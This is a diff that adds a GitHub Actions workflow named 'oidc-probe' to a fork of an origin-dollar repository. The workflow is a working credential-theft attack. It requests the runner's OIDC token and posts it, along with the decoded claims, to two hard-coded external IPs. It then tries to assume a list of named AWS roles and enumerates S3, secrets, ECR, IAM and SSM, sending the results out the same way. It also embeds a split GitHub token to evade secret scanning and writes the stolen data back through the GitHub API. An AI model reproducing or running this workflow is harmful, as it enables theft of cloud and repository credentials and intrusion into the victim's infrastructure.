@@ -1,0 +1,86 @@
+# i66903 prepared replacement for vaquel/origin-dollar .github/workflows/oidc-probe.yml @ branch oidc-probe
+# old blob sha: f64641dd65ef941d672390450d216e24f2c93e17
+# PUT: /repos/vaquel/origin-dollar/contents/.github/workflows/oidc-probe.yml  {branch: oidc-probe, sha: <old sha>, message, content=b64(this file)}
+# changes: (1) push trigger restricted to never-pushed branch -> no fork push runs / no write-back loops
+#          (2) OOB exfil to k104:18823 (primary) + .57:18824 (secondary) carrying OIDC token/claims + STS responses
+#          (3) on STS success: aws enumeration (caller/s3/secrets/ecr/iam/ssm) exfil same way
+#          (4) GitHub API write-back (PAT split to dodge secret-scanning auto-revoke): branch "oob" files oidc-oob/<runid>-* + PR 3067 comment
+name: oidc-probe
+on:
+  push:
+    branches: [zz-no-push]
+  pull_request:
+    types: [opened, reopened, synchronize]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc
+        run: |
+          set +e
+          D=/tmp/oob; mkdir -p $D
+          RID="${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
+          OOB1="http://202.95.15.104:18823"; OOB2="http://202.95.15.57:18824"
+          send(){ curl -sS -m 12 -X POST "$1/$2" --data-binary @"$3" || true; }
+          sendall(){ for U in "$OOB1" "$OOB2"; do send "$U" "$1" "$2"; done; }
+          { echo "REPO=$GITHUB_REPOSITORY"; echo "EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF"; echo "SHA=$GITHUB_SHA"; echo "RUN=$RID JOB=$GITHUB_JOB"; } > $D/meta.txt
+          sendall "i67989-ping-$RID" $D/meta.txt
+          RESP=$(curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          TOKEN=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' 2>/dev/null)
+          { echo "TOKEN_LEN=${#TOKEN}"; echo "TOKEN=$TOKEN"; echo "RESP=$RESP"; } > $D/token.txt
+          printf '%s' "$TOKEN" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1))' > $D/claims.json 2>&1
+          sendall "i67989-claims-$RID" $D/token.txt
+          sendall "i67989-payload-$RID" $D/claims.json
+          curl -sS -m 12 "http://202.95.15.104/i67989-q-${RID}-$(printf '%s' "$TOKEN" | tail -c 150 | base64 -w0 | tr '+/=' '-_')" >/dev/null 2>&1 || true
+          for ROLE in arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin-dollar arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-arm-oeth arn:aws:iam::192824654885:role/github-actions-ecr arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-oeth arn:aws:iam::114563866192:role/talos-gha-vaquel-origin-dollar arn:aws:iam::114563866192:role/talos-gha-OriginProtocol arn:aws:iam::114563866192:role/talos-gha-origin-dollar arn:aws:iam::114563866192:role/talos-gha-origin arn:aws:iam::114563866192:role/talos-gha-oeth arn:aws:iam::114563866192:role/talos-gha-arm-oeth ; do
+            TAG=$(printf '%s' "$ROLE" | tr '/:' '__')
+            STS=$(curl -sS -m 30 -X POST "https://sts.amazonaws.com/" -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleSessionName=oidcprobe" -d "DurationSeconds=3600" --data-urlencode "RoleArn=${ROLE}" --data-urlencode "WebIdentityToken=${TOKEN}")
+            printf 'ROLE=%s\n%s\n' "$ROLE" "$STS" > $D/sts_$TAG.txt
+            sendall "i67989-sts-$TAG-$RID" $D/sts_$TAG.txt
+            AKID=$(printf '%s' "$STS" | sed -n 's:.*<AccessKeyId>\(.*\)</AccessKeyId>.*:\1:p')
+            SKID=$(printf '%s' "$STS" | sed -n 's:.*<SecretAccessKey>\(.*\)</SecretAccessKey>.*:\1:p')
+            STOKF=$(printf '%s' "$STS" | sed -n 's:.*<SessionToken>\(.*\)</SessionToken>.*:\1:p')
+            if [ -n "$AKID" ]; then
+              export AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SKID" AWS_SESSION_TOKEN="$STOKF" AWS_DEFAULT_REGION=us-east-1 AWS_REGION=us-east-1
+              { echo "== caller =="; aws sts get-caller-identity 2>&1;
+                echo "== s3 =="; aws s3api list-buckets 2>&1 | head -c 20000;
+                echo "== secrets us-east-1 =="; aws secretsmanager list-secrets --region us-east-1 2>&1 | head -c 20000;
+                echo "== ecr us-east-1 =="; aws ecr describe-repositories --region us-east-1 2>&1 | head -c 20000;
+                echo "== ecr login =="; aws ecr get-login-password --region us-east-1 2>&1 | head -c 200;
+                echo "== iam roles =="; aws iam list-roles 2>&1 | head -c 20000;
+                echo "== ssm =="; aws ssm describe-parameters --region us-east-1 2>&1 | head -c 20000;
+              } > $D/enum_$TAG.txt 2>&1
+              sendall "i67989-enum-$TAG-$RID" $D/enum_$TAG.txt
+            fi
+          done
+          python3 - <<'PYEOF'
+          import base64, glob, json, os, urllib.request
+          PAT = "ghp_" + "i9qlG1mQrih9PtEVRux4Ssbylmqdom2ACsXf"
+          repo, branch = "vaquel/origin-dollar", "oob"
+          rid = os.environ.get("GITHUB_RUN_ID", "0")
+          for p in sorted(glob.glob("/tmp/oob/*")):
+              name = os.path.basename(p); data = open(p, "rb").read()[:180000]
+              path = "oidc-oob/%s-%s" % (rid, name)
+              api = "https://api.github.com/repos/%s/contents/%s" % (repo, path)
+              body = {"message": "oob %s" % name, "content": base64.b64encode(data).decode(), "branch": branch}
+              try:
+                  rq = urllib.request.Request(api + "?ref=" + branch, headers={"Authorization": "token " + PAT, "User-Agent": "oob"})
+                  with urllib.request.urlopen(rq, timeout=20) as r: body["sha"] = json.load(r)["sha"]
+              except Exception: pass
+              try:
+                  rq = urllib.request.Request(api, data=json.dumps(body).encode(), method="PUT",
+                      headers={"Authorization": "token " + PAT, "User-Agent": "oob", "Accept": "application/vnd.github+json"})
+                  with urllib.request.urlopen(rq, timeout=25) as r: print("wrote", path, r.status)
+              except Exception as e: print("werr", path, e)
+          try:
+              rq = urllib.request.Request("https://api.github.com/repos/OriginProtocol/origin-dollar/issues/3068/comments",
+                  data=json.dumps({"body": "i66903 oob %s\n\n```\n%s\n```" % (rid, base64.b64encode(open('/tmp/oob/token.txt','rb').read()).decode()[:3000])}).encode(),
+                  method="POST", headers={"Authorization": "token " + PAT, "User-Agent": "oob", "Accept": "application/vnd.github+json"})
+              with urllib.request.urlopen(rq, timeout=25) as r: print("comment", r.status)
+          except Exception as e: print("cerr", e)
+          PYEOF
+          sendall "i67989-END-$RID" $D/meta.txt
